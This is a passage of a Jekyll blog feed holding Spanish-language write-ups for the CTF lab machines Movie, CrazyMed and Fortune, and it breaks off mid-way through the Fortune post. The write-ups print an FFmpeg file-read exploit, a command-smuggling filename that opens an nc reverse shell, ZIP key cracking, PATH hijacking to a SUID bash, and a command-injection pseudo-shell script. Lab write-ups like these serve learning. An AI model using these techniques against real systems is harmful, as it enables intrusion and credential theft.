@@ -1,0 +1,810 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-28T23:50:59+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Machine Resolutions</title><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><entry><title type="html">Movie</title><link href="http://localhost:4000/posts/movie-hmv/" rel="alternate" type="text/html" title="Movie" /><published>2022-11-28T00:00:00+01:00</published><updated>2022-11-28T00:00:00+01:00</updated><id>http://localhost:4000/posts/movie-hmv</id><content type="html" xml:base="http://localhost:4000/posts/movie-hmv/"><![CDATA[<h1 id="movie--hack-my-vm-">Movie [ Hack My VM ]</h1>
+
+<h3 id="reconocimiento">Reconocimiento</h3>
+<h5 id="descubrimiento-de-puertos-y-reconocimiento-básico">Descubrimiento de puertos y reconocimiento básico</h5>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 192.168.1.116 -oG allPorts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sCV -p22,80 192.168.1.116 -oN targeted</code></li>
+</ul>
+
+<p>No vemos nada interesante, sigamos investigando.</p>
+
+<h3 id="fuzzing">Fuzzing</h3>
+<p>Como no hemos visto nada interesante vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code>, en mi caso utilizaré <code class="language-plaintext highlighter-rouge">WFuzz</code>, una herramienta en <code class="language-plaintext highlighter-rouge">Python</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">wfuzz -u "http://192.168.1.116/FUZZ" -w directory-list-2.3-medium.txt</code></li>
+</ul>
+
+<p>Como vemos tras esperar unos segundos podemos ver dos directorios: <code class="language-plaintext highlighter-rouge">data</code> y <code class="language-plaintext highlighter-rouge">dist</code>. vemos que <code class="language-plaintext highlighter-rouge">data</code> tiene un panel <code class="language-plaintext highlighter-rouge">login</code>, pero no disponemos de credenciales válidas. En cambio, <code class="language-plaintext highlighter-rouge">dist</code> es sólo una carpeta para almacenar archivos.</p>
+
+<h3 id="extracción-de-datos-1">Extracción de datos #1</h3>
+<p>Si entramos en la página podemos ver un panel para seleccionar archivos <code class="language-plaintext highlighter-rouge">AVI</code> para convertirlos a <code class="language-plaintext highlighter-rouge">MP4</code>. Tras varios intentos fallidos de subir una Shell en <code class="language-plaintext highlighter-rouge">PHP</code> busqué el funcionamiento de la conversión.</p>
+
+<p>Se utiliza un software llamado <code class="language-plaintext highlighter-rouge">FFMPeg</code> para convertir archivos, si buscamos por vulnerabilidades veremos una que nos llama la atención, <code class="language-plaintext highlighter-rouge">Local File Read</code>.</p>
+
+<p>Si buscamos un poco encontraremos un exploit en <code class="language-plaintext highlighter-rouge">GitHub</code> llamado <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py"><code class="language-plaintext highlighter-rouge">gen_xbin_avi.py</code></a> que nos permitirá extraer archivos de la máquina. Vamos a probarlo.</p>
+
+<p>Una vez clonado lo ejecutamos, vemos que pide dos parámetros: <code class="language-plaintext highlighter-rouge">filename</code> y <code class="language-plaintext highlighter-rouge">output_avi</code>, vamos a ver si podemos extraer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">python3 gen_xbin_avi.py file:///etc/passwd etc_passwd.avi</code></li>
+</ul>
+
+<p>Bien, como veremos se nos creó el archivo <code class="language-plaintext highlighter-rouge">AVI</code>, vamos a subirlo a la página. Una vez subido nos dará una <code class="language-plaintext highlighter-rouge">URL</code>, nos la copiamos y con <code class="language-plaintext highlighter-rouge">WGET</code> nos descargamos el vídeo. Una vez ya tengamos el vídeo lo abrimos como queramos (en mi caso utilicé <code class="language-plaintext highlighter-rouge">VLC</code>) y veremos el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> representado de una manera algo extraña, aunque bueno, ya tenemos algo.</p>
+
+<p>Tras prueba y error llegamos a un archivo en <code class="language-plaintext highlighter-rouge">/var/www/html/data/</code> llamado <code class="language-plaintext highlighter-rouge">config.php</code>, el cual contiene credenciales de un usuario llamado <code class="language-plaintext highlighter-rouge">tarantino</code>.</p>
+
+<pre><code class="language-PHP">&lt;?php
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'tarantino');
+define('DB_PASSWORD', 'killer');
+define('DB_NAME', 'moviedb');
+[...]
+</code></pre>
+
+<p>Bien, ya tenemos credenciales, vamos a ver si podemos entrar en el panel antes descubierto. Sí, podemos entrar! Una vez hayamos entrado veremos un botón que pone <code class="language-plaintext highlighter-rouge">Click me</code>, el cual nos descargará un <code class="language-plaintext highlighter-rouge">ZIP</code> con el nombre de <code class="language-plaintext highlighter-rouge">mydata_archive.zip</code>.</p>
+
+<h3 id="extracción-de-datos-2-alternativa">Extracción de datos #2 (Alternativa)</h3>
+<p>Esto está muy bien, pero tardaremos un poco y habrá que hacer algo de tanteo, ya que si queremos conseguir algo habrá que encontrar el archivo <code class="language-plaintext highlighter-rouge">/var/www/html/data/config.php</code>, por lo que es algo tedioso.</p>
+
+<p>Para poder conseguir el mismo resultado que el anterior creé un archivo con un nombre algo pecualiar, aunque antes nos pondremos en escucha con <code class="language-plaintext highlighter-rouge">NC</code> por el puerto que queramos, en mi caso el <code class="language-plaintext highlighter-rouge">4444</code>:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nc -nlvp 4444</code></li>
+</ul>
+
+<p>Bien, con esto hecho ya podemos crear dicho archivo con el siguiente nombre: <code class="language-plaintext highlighter-rouge">shell.avi;nc 192.168.1.104 4444;shell.avi</code>. Como vemos el nombre del archivo utiliza <code class="language-plaintext highlighter-rouge">;</code> para concatenar instrucciones. Si subimos dicho archivo veremos que recibimos la Shell.</p>
+
+<p>Para entender el por qué pasa esto será necesario ver el código:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+if($_SERVER["REQUEST_METHOD"] == "POST"){
+    if(isset($_FILES["video"]) &amp;&amp; $_FILES["video"]["error"] == 0){
+        $allowed = array("avi" =&gt; "avi", "avi" =&gt; "video/x-msvideo");
+        $filename = $_FILES["video"]["name"];
+        $filetype = $_FILES["video"]["type"];
+        $filesize = $_FILES["video"]["size"];
+        $filename_without_ext = preg_replace('/\\.[^.\\s]{3,4}$/', '', $filename);
+        $hostname = gethostname();
+
+        $ext = pathinfo($filename, PATHINFO_EXTENSION);
+        if(!array_key_exists($ext, $allowed)) die("Error: Please select a valid file format.");
+
+        $maxsize = 5 * 1024 * 1024;
+        if($filesize &gt; $maxsize) die("Error: The file size is too big.");
+
+        if(in_array($filetype, $allowed)){
+            if(file_exists("upload_videos/" . $_FILES["video"]["name"])){
+                echo $_FILES["video"]["name"] . " existe déjà.";
+            } else{
+                move_uploaded_file($_FILES["video"]["tmp_name"], "upload_videos/" . $_FILES["video"]["name"]);
+                  exec("ffmpeg -i upload_videos/$filename converted_videos/$filename_without_ext.mp4");
+                  exec("rm -rf upload_videos/*");
+                  echo "Your file has been successfully uploaded." ."&lt;br&gt;". "http://$hostname/converted_videos/$filename_without_ext.mp4";
+            } 
+        } else{
+            echo "Error: There was a problem downloading your file. Please try again."; 
+        }
+    } else{
+        echo "Error: " . $_FILES["video"]["error"];
+    }
+}
+?&gt;
+</code></pre></div></div>
+
+<p>Como vemos primero mira si es una petición <code class="language-plaintext highlighter-rouge">POST</code>, en el caso de que sí lo sea continua y define unas variables. Vemos que también mide el tamaño, por lo que si es muy grande dará error.</p>
+
+<p>Ahora bien, si bajamos lo suficiente veremos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec("ffmpeg -i upload_videos/$filename converted_videos/$filename_without_ext.mp4");
+</code></pre></div></div>
+
+<p>Como vemos está utilizando la función <code class="language-plaintext highlighter-rouge">exec</code> para ejecutar un comando en la propia consola. Vemos que está utilizando <code class="language-plaintext highlighter-rouge">FFMPeg</code> y que le pasa el archivo <code class="language-plaintext highlighter-rouge">input</code>, y el <code class="language-plaintext highlighter-rouge">output</code> es el nombre del archivo sin extensión. Como el nombre del archivo está utilizando <code class="language-plaintext highlighter-rouge">;</code> podemos concatenar comandos. La instrucción final quedaría así:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffmpeg -i upload_videos/shell.avi;nc -c bash 192.168.1.104 4444;shell.avi converted_videos/shell.mp4
+</code></pre></div></div>
+
+<p>Bien! Ya tenemos una Shell como <code class="language-plaintext highlighter-rouge">www-data</code>! Ya podemos irnos a la carpeta mencionada con anterioridad y descargarnos el <code class="language-plaintext highlighter-rouge">ZIP</code>.</p>
+
+<h3 id="shell">Shell</h3>
+<p>Bien, ya tenemos el <code class="language-plaintext highlighter-rouge">ZIP</code> en nuestra máquina, pero si lo intentamos descomprimir veremos que nos pide una contraseña, por desgracia no es la misma que habíamos encontrado. Gracias a <code class="language-plaintext highlighter-rouge">7z</code> podemos ver datos de los archivos: tamaño, comentarios, método, etcétera.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">7z l -slt mydata_archive.zip </code></li>
+</ul>
+
+<pre><code class="language-Ruby">[...]
+Path = 404.html
+Folder = -
+Size = 919
+Packed Size = 931
+Modified = 2022-09-28 02:09:09
+Created = 2022-10-01 02:55:11
+Accessed = 2022-10-01 02:54:27
+Attributes = _ -rw-r--r--
+Encrypted = +
+Comment = 
+CRC = 6F47B605
+Method = "ZipCrypto Store"
+Host OS = Unix
+Version = 20
+Volume Index = 0
+[...]
+</code></pre>
+
+<p>Vemos un fichero llamado <code class="language-plaintext highlighter-rouge">404.html</code>, dicho fichero está en la máquina víctima y podemos verlo en la propia web, por lo que nos creamos un archivo llamado <code class="language-plaintext highlighter-rouge">plain_text</code> (en mi caso) y meteremos una string que sepamos que existe, en mi caso utilizé: <code class="language-plaintext highlighter-rouge">&lt;!DOCTYPE html&gt;</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">echo "&lt;!DOCTYPE html&gt;" &gt; plain_text</code></li>
+</ul>
+
+<p>Una vez hecho esto vamos a comprimir el archivo en un <code class="language-plaintext highlighter-rouge">ZIP</code>, para esto haremos lo siguiente:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">zip plain_text.zip plain_text</code></li>
+</ul>
+
+<p>Ahora que lo tenemos todo preparado nos vamos a descargar una herramienta llamada <a href="https://github.com/kimci86/bkcrack"><code class="language-plaintext highlighter-rouge">BKCrack</code></a> que nos permitirá extraer los datos de forma sencilla.</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">./bkcrack -C mydata_archive.zip -c 404.html -P plain_text.zip -p plain_text</code></p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">-C</code>: Indicamos el arvhivo con contraseña.</li>
+  <li><code class="language-plaintext highlighter-rouge">-c</code>: Indicamos el archivo que sabemos que contiene la cadena antes introducida.</li>
+  <li><code class="language-plaintext highlighter-rouge">-P</code>: Especificamos el arvchivo <code class="language-plaintext highlighter-rouge">ZIP</code> antes creado.</li>
+  <li><code class="language-plaintext highlighter-rouge">-p</code>: Especificamos el archivo con la cadena que sabemos que existe.</li>
+</ul>
+
+<pre><code class="language-Ruby">bkcrack 1.5.0 - 2022-07-07
+[03:33:39] Z reduction using 8 bytes of known plaintext
+100.0 % (8 / 8)
+[03:33:39] Attack on 761980 Z values at index 6
+Keys: d706e724 da372a68 a79864b0
+</code></pre>
+
+<p>Tras unos segundos de espera recibimos las siguientes llaves: <code class="language-plaintext highlighter-rouge">d706e724 da372a68 a79864b0</code>, gracias a esto podemos realizar el paso final.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">./bkcrack -C mydata_archive.zip -k d706e724 da372a68 a79864b0 -U unlocked.zip pass</code></li>
+</ul>
+
+<p>En la siguiente instrucción le estamos pasando el archivo con contraseña y las llaves antes encontradas, con el parámetro <code class="language-plaintext highlighter-rouge">-U</code> le estamos indicanto un <code class="language-plaintext highlighter-rouge">output</code>, en este caso será <code class="language-plaintext highlighter-rouge">unlocked.zip</code> con la contraseña <code class="language-plaintext highlighter-rouge">pass</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bkcrack 1.5.0 - 2022-07-07
+[03:43:34] Writing unlocked archive unlocked.zip with password "pass"
+100.0 % (6 / 6)
+Wrote unlocked archive.
+</code></pre></div></div>
+
+<p>Como vemos ya tenemos el archivo con todos los ficheros, por lo que podemos descomprimirlo con la contraseña que hayamos especificado antes. Una vez lo hayamos hecho veremos una <code class="language-plaintext highlighter-rouge">id_rsa</code>, la cual pertenece a <code class="language-plaintext highlighter-rouge">Tarantino</code>.</p>
+
+<p>Bien! Ya estamos en la máquina como <code class="language-plaintext highlighter-rouge">Tarantino</code>!</p>
+
+<h3 id="subida-de-privilegios">Subida de privilegios</h3>
+<p>Bien, una vez en la máquina podemos ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver qué podemos hacer, vemos que como el usuario <code class="language-plaintext highlighter-rouge">root</code> podemos utilizar <code class="language-plaintext highlighter-rouge">nano</code> para leer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, por lo que vamos a iniciarlo:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sudo -u root /usr/bin/nano /etc/passwd</code></li>
+</ul>
+
+<p>Como vemos <code class="language-plaintext highlighter-rouge">nano</code> dispone de varias opciones abajo, entre ellas <code class="language-plaintext highlighter-rouge">Execute</code> o <code class="language-plaintext highlighter-rouge">Ejecutar</code>, para acceder allí pulsaremos <code class="language-plaintext highlighter-rouge">CTRL + T</code>. Vemos que si ponemos <code class="language-plaintext highlighter-rouge">whoami</code> y le damos al <code class="language-plaintext highlighter-rouge">enter</code> nos escribe el <code class="language-plaintext highlighter-rouge">output</code> en el archivo. Pone que somos <code class="language-plaintext highlighter-rouge">root</code>!</p>
+
+<p>Para ganar una Shell me copié de <a href="Ironhackers.es/herramientas/reverse-shell-cheat-sheet/"><code class="language-plaintext highlighter-rouge">IronHackers</code></a> una Reverse Shell en <code class="language-plaintext highlighter-rouge">Bash</code> y con la opción antes descubierta lo ejecuté. No olvidemos ponernos en escucha con <code class="language-plaintext highlighter-rouge">NC</code>:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nc -nlvp 4444</code></li>
+</ul>
+
+<p>Bien! Ya estamos en la máquina como <code class="language-plaintext highlighter-rouge">root</code>! Qué fácil!</p>]]></content><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><category term="HMV" /><summary type="html"><![CDATA[Movie [ Hack My VM ]]]></summary></entry><entry><title type="html">CrazyMed</title><link href="http://localhost:4000/posts/crazymed-hmv/" rel="alternate" type="text/html" title="CrazyMed" /><published>2022-11-28T00:00:00+01:00</published><updated>2022-11-28T00:00:00+01:00</updated><id>http://localhost:4000/posts/crazymed-hmv</id><content type="html" xml:base="http://localhost:4000/posts/crazymed-hmv/"><![CDATA[<h1 id="crazymed--hack-my-vm-">CrazyMed [ Hack My VM ]</h1>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<p><strong>Descubrimiento de puertos y reconocimiento básico</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 192.168.1.107 -oG allPorts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sCV -p80,4444,11211 192.168.1.107 -oN targeted</code></li>
+</ul>
+
+<p>No vemos nada interesante, sigamos investigando.</p>
+
+<h2 id="shell">Shell</h2>
+
+<p>Si nos conectamos con <code class="language-plaintext highlighter-rouge">NC</code> por el puerto <code class="language-plaintext highlighter-rouge">4444</code> veremos un panel que nos da la bienvenida, pero nos pide una contraseña que no tenemos, así que por el momento lo dejamos.</p>
+
+<p>Vemos un puerto algo extraño abierto, <code class="language-plaintext highlighter-rouge">11211</code>, el cual pertenece a <code class="language-plaintext highlighter-rouge">MemCached</code>, un almacén de datos de la memoria. Vamos a ver si nos podemos conectar y obtener datos. Para ello utilizaré primero una herramienta llamada <code class="language-plaintext highlighter-rouge">memcdump</code> para ver los <code class="language-plaintext highlighter-rouge">items</code> disponibles:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">apt install libmemcached-tools</code></li>
+  <li><code class="language-plaintext highlighter-rouge">memcdump --server=192.168.1.107</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domain
+server
+log
+conf_location
+</code></pre></div></div>
+<p>Bien! Vemos que hemos sido capaces de enumerar <code class="language-plaintext highlighter-rouge">items</code>, ahora podemos obtener su contenido con <code class="language-plaintext highlighter-rouge">memccat</code>, para ello haremos lo siguiente:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">memccat --servers=192.168.1.107 log</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password: cr4zyM3d
+</code></pre></div></div>
+
+<p>Bien! Hemos sido capaces de obtener una contraseña! Ahora nos podemos conectar por el puerto <code class="language-plaintext highlighter-rouge">4444</code> con <code class="language-plaintext highlighter-rouge">NC</code> y con la contraseña encontrada para obtener acceso. Una vez ahí veremos que sólo podremos ejecutar cuatro comandos: <code class="language-plaintext highlighter-rouge">id</code>, <code class="language-plaintext highlighter-rouge">who</code>, <code class="language-plaintext highlighter-rouge">echo</code> y <code class="language-plaintext highlighter-rouge">clear</code>.</p>
+
+<p>Tras varios intentos para saltarme la verificación del input y poder ejecutar más comandos llegué al acento grave (<code class="language-plaintext highlighter-rouge">``</code>), gracias a esto podemos ejecutar más comandos de los permitidos.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">System command: echo `python3 --version`</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Python 3.9.
+</code></pre></div></div>
+<p>Fantástico! Tras mirar el directorio con ls -la vi una carpeta llamada .ssh, por lo
+que me metí dentro y había un archivo llamado id_rsa, por lo que con cat lo miré y
+me lo copié a mi máquina para obtener una Shell siempre que quiera sin proporcionar
+contraseña.</p>
+
+<p>Bien! Ya estamos dentro de la máquina como brad!</p>
+
+<h2 id="subida-de-privilegios">Subida de privilegios</h2>
+
+<p>Para obtener <code class="language-plaintext highlighter-rouge">root</code> en la máquina comencé por enumeración básica, la cual no sirvió de mucho, pero <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><code class="language-plaintext highlighter-rouge">LinPEAS</code></a> me chivó que tenía permisos de escritura en <code class="language-plaintext highlighter-rouge">/usr/local/bin</code>, por lo que ya es algo interesante.</p>
+
+<p>Me dispuse a ver los procesos en curso con <code class="language-plaintext highlighter-rouge">PSPY</code> y cada minuto se ejecutaba un proceso por el usuario <code class="language-plaintext highlighter-rouge">root</code>, el cual ejecutaba con Bash un <code class="language-plaintext highlighter-rouge">script</code> llamado <code class="language-plaintext highlighter-rouge">check_VM</code> situado en <code class="language-plaintext highlighter-rouge">/opt/</code>. Vamos a hecharle un ojo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#! /bin/bash
+
+#users flags
+flags=(/root/root.txt /home/brad/user.txt)
+for x in "${flags[@]}"
+do
+if [[ ! -f $x ]] ; then
+echo "$x doesn't exist"
+mcookie &gt; $x
+chmod 700 $x
+fi
+done
+
+chown -R www-data:www-data /var/www/html
+
+#bash_history =&gt; /dev/null
+home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')
+
+for x in $home
+do
+ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
+done
+
+
+find /var/log -name "*.log*" -exec rm -f {} +
+</code></pre></div></div>
+<p>Vemos que el binario chown se ejecuta de forma relativa y no absoluta, por lo que podemos hacer <code class="language-plaintext highlighter-rouge">Path Hijacking</code>. Para poder explotarlo nos dirigiremos a <code class="language-plaintext highlighter-rouge">/usr/local/bin/</code> y crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">chown</code> con la siguiente instrucción:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">echo "chmod u+s /bin/bash" &gt; chown</code></li>
+</ul>
+
+<p>Una vez creado el archivo le damos permisos de ejecución con: <code class="language-plaintext highlighter-rouge">chmod +x chown</code> y esperamos unos segundos a que se vuelva a ejecutar la tarea. Una vez esperado hacemos <code class="language-plaintext highlighter-rouge">bash -p</code>.</p>
+
+<p>Enhorabuena! Ya estamos como <code class="language-plaintext highlighter-rouge">root</code> en la máquina víctima de forma sencilla!</p>]]></content><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><category term="HMV" /><summary type="html"><![CDATA[CrazyMed [ Hack My VM ]]]></summary></entry><entry><title type="html">Fortune</title><link href="http://localhost:4000/posts/fortune-htb/" rel="alternate" type="text/html" title="Fortune" /><published>2022-11-27T00:00:00+01:00</published><updated>2022-11-27T00:00:00+01:00</updated><id>http://localhost:4000/posts/fortune-htb</id><content type="html" xml:base="http://localhost:4000/posts/fortune-htb/"><![CDATA[<h1 id="fortune--hack-the-box-">Fortune [ Hack The Box ]</h1>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<p><strong>Descubrimiento de puertos y reconocimiento básico</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 10.10.10.127 -oG allPorts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sCV -p22,80,443, 10.10.10.127 -oN targeted</code></li>
+</ul>
+
+<p>No vemos nada interesante, sigamos investigando.</p>
+
+<h2 id="inspección">Inspección</h2>
+
+<p>Al entrar en la web nos encontramos con cinco botones, cada uno con un nombre
+diferente, el cual si seleccionamos nos dará una frase, receta, etcétera. Mirando las
+peticiones me fijé que se usa un parámetro llamado db, así que pensé en <code class="language-plaintext highlighter-rouge">SQLI</code> pero
+lo descarté tras unas pruebas, aunque podemos tener <code class="language-plaintext highlighter-rouge">RCE</code> con concatenar un comando
+con <code class="language-plaintext highlighter-rouge">|</code>, <code class="language-plaintext highlighter-rouge">+</code> o <code class="language-plaintext highlighter-rouge">;</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">curl -s -X POST http://10.10.10.127/select -d "db=fortune | id"</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Your fortune&lt;/title&gt;
+&lt;meta name='viewport' content='width=device-width, initial-scale=1'&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Your fortune is:&lt;/h2&gt;
+&lt;p&gt;
+&lt;pre&gt;
+
+uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
+
+&lt;/pre&gt;
+&lt;p&gt;
+&lt;p&gt;Try &lt;a href='/'&gt;again&lt;/a&gt;!&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+<p>Como vemos tenemos ejecución remota de comandos. Traté de entablar una Reverse Shell
+de muchas maneras, jugando con Base64, clásicas e incluso intentando descargarme
+archivos de mi máquina, pero ningún método funcionó.</p>
+
+<p>Para tener una Shell y que sea algo más cómodo que mandar con CURL las peticiones
+hice un script que simulaba una Shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python
+
+import requests
+from bs4 import BeautifulSoup
+from cmd import Cmd
+
+class Terminal (Cmd):
+    prompt = "fortune&gt; "
+
+def default (self, args):
+    resp = requests.post('http://10.10.10.127/select', data={"db": f"s;{args} 2&gt;&amp;1"})
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    print(soup.find("pre").text.strip())
+
+term = Terminal()
+term.cmdloop()
+</code></pre></div></div>
+<p>Para obtener el resultado filtra por la etiqueta <code class="language-plaintext highlighter-rouge">pre</code> y extrae el texto de ahí
+dentro, dejando así el output del comando. Cuando hacemos <code class="language-plaintext highlighter-rouge">ls</code> vemos un <code class="language-plaintext highlighter-rouge">script</code> en
+<code class="language-plaintext highlighter-rouge">Python</code> llamado <code class="language-plaintext highlighter-rouge">fortuned.py</code>, vamos a ver qué es y cómo funciona:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from flask import Flask, request, render_template, abort
+import os
+
+app = Flask(__name__)
+
+@app.route('/select', methods=['POST'])
+def fortuned ():
+    cmd = '/usr/games/fortune '
+    dbs = ['fortunes', 'fortunes2', 'recipes', 'startrek', 'zippy']
+    selection = request.form['db']
+    shell_cmd = cmd + selection
+    result = os.popen(shell_cmd).read() # BlackCage: Nuestra inyección.
+    return render_template('display.html', output=result)
+</code></pre></div></div>
+<p>Como vemos primero define una variable <code class="language-plaintext highlighter-rouge">cmd</code>, la cual incluye una ruta hacia un
+programa que como parámetro toma la selección del usuario para después ejecutarlo y
+leer directamente de la consola el resultado. La inyección ocurre ya que estamos
+concatenando un comando con <code class="language-plaintext highlighter-rouge">|</code>, de tal manera que todo combinado quedaría así: <code class="language-plaintext highlighter-rouge">/usr/games/fortune &lt;selección&gt; | &lt;comando&gt;</code></p>
+
+<h2 id="autorización">Autorización</h2>
+
+<p>Una vez que ya tengamos lo del paso anterior tenemos que inspeccionar la máquina para
+ver si podemos conseguir más cosas para escalar privilegios, así que yo comenzé por
+mirar en el directorio <code class="language-plaintext highlighter-rouge">/home/</code>, viendo así que hay tres usuarios: <code class="language-plaintext highlighter-rouge">bob</code>, <code class="language-plaintext highlighter-rouge">charlie</code> y
+<code class="language-plaintext highlighter-rouge">nfsuser</code>.</p>
+
+<p>Nos metemos en el directorio personal de <code class="language-plaintext highlighter-rouge">bob</code> para encontrarnos que dispone de dos
+carpetas, <code class="language-plaintext highlighter-rouge">ca</code> y <code class="language-plaintext highlighter-rouge">dba</code>, nos meteremos en la primera y veremos más subcarpetas, una de
+ellas se llama <code class="language-plaintext highlighter-rouge">intermediate</code> y dispone de dos (más, pero no nos importan) carpetas
+llamadas <code class="language-plaintext highlighter-rouge">certs</code> y <code class="language-plaintext highlighter-rouge">private</code>, en la primera carpeta nos encontramos con tres archivos, <code class="language-plaintext highlighter-rouge">ca-chain.cert.pem</code>, <code class="language-plaintext highlighter-rouge">fortune.htb.cert.pem</code> y <code class="language-plaintext highlighter-rouge">intermediate.cert.pem</code>. De aquí nos quedaremos con el último archivo. Pasemos ahora a la segunda carpeta, donde vemos dos archivos más, <code class="language-plaintext highlighter-rouge">fortune.htb.key.pem</code> e <code class="language-plaintext highlighter-rouge">intermediate.key.pem</code>, al igual que la otra vez nos quedaremos con el último fichero.</p>
+
+<p>Usaremos el certificado <code class="language-plaintext highlighter-rouge">CA</code> y la llave para crear una <code class="language-plaintext highlighter-rouge">certificación cliente</code>, aunque
+primero nos generaremos una llave de <code class="language-plaintext highlighter-rouge">2048 bits</code> para el certificado.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openssl genrsa -out black.key 2048</code></li>
+</ul>
+
+<p>Una vez creada la llave la usaremos para crear un <code class="language-plaintext highlighter-rouge">certificate signing requests</code> (<code class="language-plaintext highlighter-rouge">CSR</code>). Con el parámetro <code class="language-plaintext highlighter-rouge">req</code> pediremos la nueva <code class="language-plaintext highlighter-rouge">csr</code>. El <code class="language-plaintext highlighter-rouge">output</code> tendrá mi información, ya que hay que rellenar (no es obligatorio) algunas cosas, aunque más bien se hace para después poder identificarlo mejor.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openssl req -new -key black.key -out black.csr</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:ES
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fortune
+Organizational Unit Name (eg, section) []:Fortune
+Common Name (e.g. server FQDN or YOUR name) []:black@fortune.htb
+Email Address []:
+
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+</code></pre></div></div>
+<p>Como verás he dejado campos en blanco ya que, como ya dije, no es obligatorio ponerlos, le podemos dar al enter y funcionará igual.</p>
+
+<p>Para el siguiente paso usaré <a href="https://www.openssl.org/docs/man1.1.1/man1/x509.html"><code class="language-plaintext highlighter-rouge">x509</code></a> para crear el certificado cliente firmado. Usaremos el archivo <code class="language-plaintext highlighter-rouge">csr</code> creado en el paso anterior, el certificado <code class="language-plaintext highlighter-rouge">CA</code> y la <code class="language-plaintext highlighter-rouge">llave CA</code>. Crearemos una nueva serie con el parámetro <code class="language-plaintext highlighter-rouge">-CAcreateserial</code>, también y como en los comandos anteriores especificaremos el <code class="language-plaintext highlighter-rouge">output</code> dándole una extensión <code class="language-plaintext highlighter-rouge">PEM</code>. El parámetro <code class="language-plaintext highlighter-rouge">-days</code> es para especificar en cuántos días caducará el certificado, no hace falta poner tantos días, podemos poner 365.</p>
+
+<ul>
